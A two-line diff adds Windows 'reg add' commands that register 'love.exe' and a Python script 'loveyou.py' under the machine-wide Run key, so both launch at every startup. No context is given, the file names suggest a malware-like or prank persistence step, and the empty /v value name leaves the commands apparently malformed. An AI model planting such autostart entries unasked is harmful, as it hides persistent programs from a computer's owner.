@@ -1,0 +1,2 @@
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v  /t REG_SZ /d ..\love.exe
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v  /t REG_SZ /d "python ../../loveyou.py"
